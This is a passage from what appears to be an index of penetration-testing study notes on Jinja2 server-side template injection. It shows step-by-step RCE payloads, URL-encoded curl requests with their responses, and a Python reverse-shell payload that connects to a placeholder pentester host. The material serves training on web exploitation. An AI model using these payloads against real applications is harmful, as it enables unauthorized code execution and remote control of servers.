6 bytes 7 list 8 NoneType 9 NotImplementedType 10 traceback 11 super 12 range 13 dict 14 dict_keys 15 dict_values 16 dict_items 17 dict_reversekeyiterator 18 dict_reversevalueiterator 19 dict_reverseitemiterator 20 odict_iterator 21 set 22 str 23 slice 24 staticmethod 25 complex 26 float 27 frozenset 28 property 29 managedbuffer 30 memoryview 31 tuple 32 enumerate 33 reversed 34 stderrprinter 35 code 36 frame 37 builtin_function_or_method 38 method 39 function 40 mappingproxy 41 generator 42 getset_descriptor 43 wrapper_descriptor 44 method-wrapper 45 ellipsis 46 member_descriptor 47 SimpleNamespace 48 PyCapsule 49 longrange_iterator 50 cell 51 instancemethod 52 classmethod_descriptor 53 method_descriptor 54 callable_iterator 55 iterator 56 PickleBuffer 57 coroutine 58 coroutine_wrapper 59 InterpreterID 60 EncodingMap 61 fieldnameiterator 62 formatteriterator 63 BaseException 64 hamt 65 hamt_array_node 66 hamt_bitmap_node 67 hamt_collision_node 68 keys 69 values 70 items 71 Context 72 ContextVar 73 Token 74 MISSING 75 moduledef 76 module 77 filter 78 map 79 zip 80 _ModuleLock 81 _DummyModuleLock 82 _ModuleLockManager 83 ModuleSpec 84 BuiltinImporter 85 classmethod 86 FrozenImporter 87 _ImportLockContext 88 _localdummy 89 _local 90 lock 91 RLock 92 _IOBase 93 _BytesIOBuffer 94 IncrementalNewlineDecoder 95 ScandirIterator 96 DirEntry 97 WindowsRegistryFinder 98 _LoaderBasics 99 FileLoader 100 _NamespacePath 101 _NamespaceLoader 102 PathFinder 103 FileFinder 104 zipimporter 105 _ZipImportResourceReader 106 Codec 107 IncrementalEncoder 108 IncrementalDecoder 109 StreamReaderWriter 110 StreamRecoder 111 _abc_data 112 ABC 113 dict_itemiterator 114 Hashable 115 Awaitable 116 AsyncIterable 117 async_generator 118 Iterable 119 bytes_iterator 120 bytearray_iterator 121 dict_keyiterator 122 dict_valueiterator 123 list_iterator 124 list_reverseiterator 125 range_iterator 126 set_iterator 127 str_iterator 128 tuple_iterator 129 Sized 130 Container 131 Callable 132 _wrap_close 133 Quitter 134 _Printer 135 _Helper 136 itemgetter 137 attrgetter 138 methodcaller 139 accumulate 140 combinations 141 combinations_with_replacement 142 cycle 143 dropwhile 144 takewhile 145 islice 146 starmap 147 chain 148 compress 149 filterfalse 150 count 151 zip_longest 152 permutations 153 product 154 repeat 155 groupby 156 _grouper 157 _tee 158 _tee_dataobject 159 Repr 160 deque 161 _deque_iterator 162 _deque_reverse_iterator 163 _tuplegetter 164 _Link 165 partial 166 _lru_cache_wrapper 167 partialmethod 168 singledispatchmethod 169 cached_property 170 DynamicClassAttribute 171 _GeneratorWrapper 172 auto 173 Enum 174 Pattern 175 Match 176 SRE_Scanner 177 State 178 SubPattern 179 Tokenizer 180 Scanner 181 Template 182 Formatter 183 ContextDecorator 184 _GeneratorContextManagerBase 185 _BaseExitStack 186 _Final 187 _Immutable 188 Generic 189 _TypingEmpty 190 _TypingEllipsis 191 NamedTuple 192 typing.io 193 typing.re 194 AST 195 _MarkupEscapeHelper 196 poll 197 epoll 198 BaseSelector 199 socket 200 _IterationGuard 201 WeakSet 202 _RLock 203 Condition 204 Semaphore 205 Event 206 Barrier 207 Thread 208 BaseServer 209 ForkingMixIn 210 _NoThreads 211 ThreadingMixIn 212 BaseRequestHandler 213 WarningMessage 214 catch_warnings 215 date 216 timedelta 217 time 218 tzinfo 219 _Info 220 finalize 221 sha384 222 sha512 223 Random 224 _ResultMixinStr 225 _ResultMixinBytes 226 _NetlocResultMixinBase 227 _localized_month 228 _localized_day 229 Calendar 230 different_locale 231 AddrlistClass 232 Struct 233 unpack_iterator 234 Charset 235 Header 236 _ValueFormatter 237 _PolicyBase 238 BufferedSubFile 239 FeedParser 240 Parser 241 BytesParser 242 Message 243 HTTPConnection 244 _SSLContext 245 _SSLSocket 246 MemoryBIO 247 Session 248 SSLObject 249 MimeTypes 250 Compress 251 Decompress 252 BZ2Compressor 253 BZ2Decompressor 254 LZMACompressor 255 LZMADecompressor 256 Bytecode 257 Untokenizer 258 BlockFinder 259 _void 260 _empty 261 Parameter 262 BoundArguments 263 Signature 264 FrameSummary 265 TracebackException 266 LogRecord 267 PercentStyle 268 Formatter 269 BufferingFormatter 270 Filter 271 Filterer 272 PlaceHolder 273 Manager 274 LoggerAdapter 275 _Missing 276 Aborter 277 Href 278 CompletedProcess 279 Popen 280 HASH 281 blake2b 282 blake2s 283 sha3_224 284 sha3_256 285 sha3_384 286 sha3_512 287 shake_128 288 shake_256 289 _RandomNameSequence 290 _TemporaryFileCloser 291 _TemporaryFileWrapper 292 SpooledTemporaryFile 293 TemporaryDirectory 294 Request 295 OpenerDirector 296 BaseHandler 297 HTTPPasswordMgr 298 AbstractBasicAuthHandler 299 AbstractDigestAuthHandler 300 URLopener 301 ftpwrapper 302 Cookie 303 CookiePolicy 304 Absent 305 CookieJar 306 ImmutableListMixin 307 ImmutableDictMixin 308 _omd_bucket 309 Headers 310 ImmutableHeadersMixin 311 IfRange 312 Range 313 ContentRange 314 FileStorage 315 _HAS_DEFAULT_FACTORY_CLASS 316 _MISSING_TYPE 317 _FIELD_BASE 318 InitVar 319 Field 320 _DataclassParams 321 Event 322 MultipartDecoder 323 MultipartEncoder 324 Finder 325 Loader 326 ResourceReader 327 ImpImporter 328 ImpLoader 329 HMAC 330 ClosingIterator 331 FileWrapper 332 _RangeWrapper 333 HTMLBuilder 334 AcceptMixin 335 AuthorizationMixin 336 WWWAuthenticateMixin 337 Scanner 338 Encoder 339 JSONDecoder 340 JSONEncoder 341 FormDataParser 342 MultiPartParser 343 UserAgent 344 _UserAgentParser 345 Request 346 StreamOnlyMixin 347 Response 348 ResponseStream 349 ResponseStreamMixin 350 CommonRequestDescriptorsMixin 351 CommonResponseDescriptorsMixin 352 ETagRequestMixin 353 ETagResponseMixin 354 UserAgentMixin 355 _TestCookieHeaders 356 _TestCookieResponse 357 EnvironBuilder 358 Client 359 Decimal 360 Context 361 SignalDictMixin 362 ContextManager 363 Number 364 UUID 365 Unpickler 366 Pickler 367 Pdata 368 PicklerMemoProxy 369 UnpicklerMemoProxy 370 _Framer 371 _Unframer 372 _Pickler 373 _Unpickler 374 Bucket 375 BytecodeCache 376 MissingType 377 LRUCache 378 Cycler 379 Joiner 380 Namespace 381 EvalContext 382 Node 383 NodeVisitor 384 Symbols 385 MacroRef 386 Frame 387 TemplateReference 388 Context 389 BlockReference 390 LoopContext 391 Macro 392 Undefined 393 NodeVisitor 394 Failure 395 TokenStreamIterator 396 TokenStream 397 Lexer 398 Parser 399 Environment 400 Template 401 TemplateModule 402 TemplateExpression 403 TemplateStream 404 BaseLoader 405 Local 406 LocalStack 407 LocalManager 408 _ProxyLookup 409 LocalProxy 410 SequenceMatcher 411 Differ 412 HtmlDiff 413 _safe_key 414 PrettyPrinter 415 RuleFactory 416 RuleTemplate 417 BaseConverter 418 Map 419 MapAdapter 420 NullTranslations 421 _FixupStream 422 _AtomicFile 423 LazyFile 424 KeepOpenFile 425 PacifyFlushWrapper 426 ParamType 427 Option 428 Argument 429 ParsingState 430 OptionParser 431 HelpFormatter 432 Context 433 BaseCommand 434 Parameter 435 Namespace 436 _FakeSignal 437 DispatchingApp 438 ScriptInfo 439 ConfigAttribute 440 _AppCtxGlobals 441 AppContext 442 RequestContext 443 Scaffold 444 _CompactJSON 445 SigningAlgorithm 446 Signer 447 Serializer 448 JSONTag 449 TaggedJSONSerializer </a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> In the application's response we can see that catch_warnings is located at index #214. We have everything we need to construct an RCE payload, such as the following {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ ()[ 214 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . system ( \"touch /tmp/test1\" ) }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>0</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> The application returns 0 in its response. This is the return of the value of the command we just executed. 0 indicates that the command was executed without errors. We can identify if test1 was created using the following payload {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ ()[ 214 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . popen ( 'ls /tmp' ) . read ()}} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>test1 tmpv4tucw2b </a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> We can use some specific functions to facilitate the exploitation of Jinja2 SSTI vulnerabilities. Those are request and lipsum . {{ request . application . __globals__ . __builtins__ . __import__ ( 'os' ) . popen ( 'id' ) . read ()}} {{ lipsum . __globals__ . os . popen ( 'id' ) . read ()}} A reverse shell can also be established through a payload such as the below {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ ()[ 214 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . popen ( 'python -c \\' socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<PENTESTER_IP>\",<PENTESTER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\") \\' ' ) . read ()}}","title":"SSTI Example3"},{"location":"server_side_attacks/ssti_example3/#python-primer-for-ssti","text":"Below is a small dictionary from fatalerrors.org to refer to when going over the Jinja2 payload development part No. Methods Description 1. __class__ Returns the object (class) to which the type belongs 2. __mro__ Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples. 3. __subclasses__ Each new class retains references to subclasses, and this method returns a list of references that are still available in the class 4. __builtins__ Returns the builtin methods included in a function 5. __globals__ A reference to a dictionary that contains global variables for a function 6. __base__ Returns the base class inherited by the object <-- (__ base__ and __ mro__ are used to find the base class) 7. __init__ Class initialization method hrmns@htb[/htb]$ python3 Python 3.9.2 (default, Feb 28 2021, 17:03:44) [GCC 10.2.1 20210110] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> Create a string object and use type and __class__ , as follows. Then use the dir() command to show all methods and attributes from the object. >>> import flask >>> s = 'HTB' >>> type ( s ) < class ' str '> >>> s . __class__ < class ' str '> >>> dir ( s ) [ '__add__' , '__class__' , '__contains__' , '__delattr__' , '__dir__' , '__doc__' , '__eq__' , '__format__' , '__ge__' , '__getattribute__' , '__getitem__' , '__getnewargs__' , '__gt__' , '__hash__' , '__init__' , '__init_subclass__' , '__iter__' , '__le__' , '__len__' , '__lt__' , '__mod__' , '__mul__' , '__ne__' , '__new__' , '__reduce__' , '__reduce_ex__' , '__repr__' , '__rmod__' , '__rmul__' , '__setattr__' , '__sizeof__' , '__str__' , '__subclasshook__' , 'capitalize' , 'casefold' , 'center' , 'count' , 'encode' , 'endswith' , 'expandtabs' , 'find' , 'format' , 'format_map' , 'index' , 'isalnum' , 'isalpha' , 'isascii' , 'isdecimal' , 'isdigit' , 'isidentifier' , 'islower' , 'isnumeric' , 'isprintable' , 'isspace' , 'istitle' , 'isupper' , 'join' , 'ljust' , 'lower' , 'lstrip' , 'maketrans' , 'partition' , 'replace' , 'rfind' , 'rindex' , 'rjust' , 'rpartition' , 'rsplit' , 'rstrip' , 'split' , 'splitlines' , 'startswith' , 'strip' , 'swapcase' , 'title' , 'translate' , 'upper' , 'zfill' ] The next step is to understand Python's hierarchy. Using __mro__ or mro() , we can go back up to three inherited objects in the Python environment. Let's practice this as follows. >>> s . __class__ . __class__ < class ' type '> >>> s . __class__ . __base__ < class ' object '> >>> s . __class__ . __base__ . __subclasses__ () [ < class ' type '>, <class ' weakref '>, <class ' weakcallableproxy '>, <class ' weakproxy '>, <class ' int '>, <class ' bytearray '>, <class ' bytes '>, <class ' list '>, <class ' NoneType '>, <class ' NotImplementedType '>, <class ' traceback '>, <class ' super '>, <class ' range '>, <class ' dict '>, <class ' dict_keys '>, <class ' dict_values '>, <class ' dict_items '>, <class ' dict_reversekeyiterator '>, <class ' dict_reversevalueiterator '>, <class ' dict_reverseitemiterator '>, <class ' odict_iterator '>, <class ' set '>, <class ' str '>, <class ' slice '>, <class ' staticmethod '>, <class ' complex '>, <class ' float '>, <class ' frozenset '>, <class ' property '>, <class ' managedbuffer '>, <class ' memoryview '>, <class ' tuple '>, <class ' enumerate '>, <class ' reversed '>, <class ' stderrprinter '>, <class ' code '>, <class ' frame '>, <class ' builtin_function_or_method '>, <class ' method '>, < SNIP > >>> s . __class__ . mro ()[ 1 ] . __subclasses__ () [ < class ' type '>, <class ' weakref '>, <class ' weakcallableproxy '>, <class ' weakproxy '>, <class ' int '>, <class ' bytearray '>, <class ' bytes '>, <class ' list '>, <class ' NoneType '>, <class ' NotImplementedType '>, <class ' traceback '>, <class ' super '>, <class ' range '>, <class ' dict '>, <class ' dict_keys '>, <class ' dict_values '>, <class ' dict_items '>, <class ' dict_reversekeyiterator '>, <class ' dict_reversevalueiterator '>, <class ' dict_reverseitemiterator '>, <class ' odict_iterator '>, <class ' set '>, <class ' str '>, <class ' slice '>, <class ' staticmethod '>, <class ' complex '>, <class ' float '>, <class ' frozenset '>, <class ' property '>, <class ' managedbuffer '>, <class ' memoryview '>, <class ' tuple '>, <class ' enumerate '>, <class ' reversed '>, <class ' stderrprinter '>, <class ' code '>, <class ' frame '>, <class ' builtin_function_or_method '>, <class ' method '>, < SNIP > Let us look for useful classes that can facilitate remote code execution. >>> x = s . __class__ . mro ()[ 1 ] . __subclasses__ () >>> for i in range ( len ( x )): print ( i , x [ i ] . __name__ ) ... 0 type 1 weakref 2 weakcallableproxy 3 weakproxy 4 int 5 bytearray 6 bytes 7 list 8 NoneType < SNIP > >>> def searchfunc ( name ): ... x = s . __class__ . mro ()[ 1 ] . __subclasses__ () ... for i in range ( len ( x )): ... fn = x [ i ] . __name__ ... if fn . find ( name ) > - 1 : ... print ( i , fn ) ... >>> searchfunc ( 'warning' ) 215 catch_warnings Why are we searching for warning you may ask. We chose this class because it imports Python's sys module , and from sys , the os module can be reached. More precisely, os modules are all from warnings.catch_ . We have seen that catch_warnings is present without importing any additional module to our Python console. Let's enumerate the builtins from this class: >>> y = x [ 215 ] >>> y < class ' warnings . catch_warnings '> >>> y () . _module . __builtins__ { '__name__' : 'builtins' , '__doc__' : \"Built-in functions, exceptions, and other objects. \\n\\n Noteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\" , '__package__' : '' , '__loader__' : < class ' _frozen_importlib . BuiltinImporter '>, ' __spec__ ': ModuleSpec(name=' builtins ', loader=<class ' _frozen_importlib . BuiltinImporter '>), ' __build_class__ ': <built-in function __build_class__>, ' __import__ ': <built-in function __import__>, ' abs ': <built-in function abs>, ' all ': <built-in function all>, ' any ': <built-in function any>, ' ascii ': <built-in function ascii>, ' bin ': <built-in function bin>, ' breakpoint ': <built-in function breakpoint>, ' callable ': <built-in function callable>, ' chr ': <built-in function chr>, ' compile ': <built-in function compile>, ' delattr ': <built-in function delattr>, ' dir ': <built-in function dir>, ' divmod ': <built-in function divmod>, ' eval ': <built-in function eval>, ' exec ': <built-in function exec>, ' format ': <built-in function format>, ' getattr ': <built-in function getattr>, ' globals ': <built-in function globals>, < SNIP > >>> z = y () . _module . __builtins__ >>> for i in z : ... if i . find ( 'import' ) >- 1 : ... print ( i , z [ i ]) ... __import__ < built - in function __import__ > It seems we have reached the import function by walking the hierarchy. This means we can load os and use the system function to execute code all coming from a string object: >>> '' . __class__ . __mro__ [ 1 ] . __subclasses__ () [ 215 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . system ( 'echo RCE from a string object' ) RCE from a string object 0 Returning to our vulnerable web application, let's see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded. Payload: {{ '' . __class__ }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>&lt;class &#39;str&#39;&gt;</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> Payload: {{ '' . __class__ . __mro__ }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> We are interested in the second item, so the payload should become: {{ '' . __class__ . __mro__ [ 1 ] }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>&lt;class &#39;object&#39;&gt;</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> Start by walking down the hierarchy {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ () }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;dict_reversekeyiterator&#39;&gt;, &lt;class &#39;dict_reversevalueiterator&#39;&gt;, &lt;class &#39;dict_reverseitemiterator&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;pickle.PickleBuffer&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;InterpreterID&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;zipimport._ZipImportResourceReader&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;_collections._tuplegetter&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;functools.singledispatchmethod&#39;&gt;, &lt;class &#39;functools.cached_property&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;re.Pattern&#39;&gt;, &lt;class &#39;re.Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.State&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;typing._Final&#39;&gt;, &lt;class &#39;typing._Immutable&#39;&gt;, &lt;class &#39;typing.Generic&#39;&gt;, &lt;class &#39;typing._TypingEmpty&#39;&gt;, &lt;class &#39;typing._TypingEllipsis&#39;&gt;, &lt;class &#39;typing.NamedTuple&#39;&gt;, &lt;class &#39;typing.io&#39;&gt;, &lt;class &#39;typing.re&#39;&gt;, &lt;class &#39;_ast.AST&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;_socket.socket&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver._NoThreads&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class 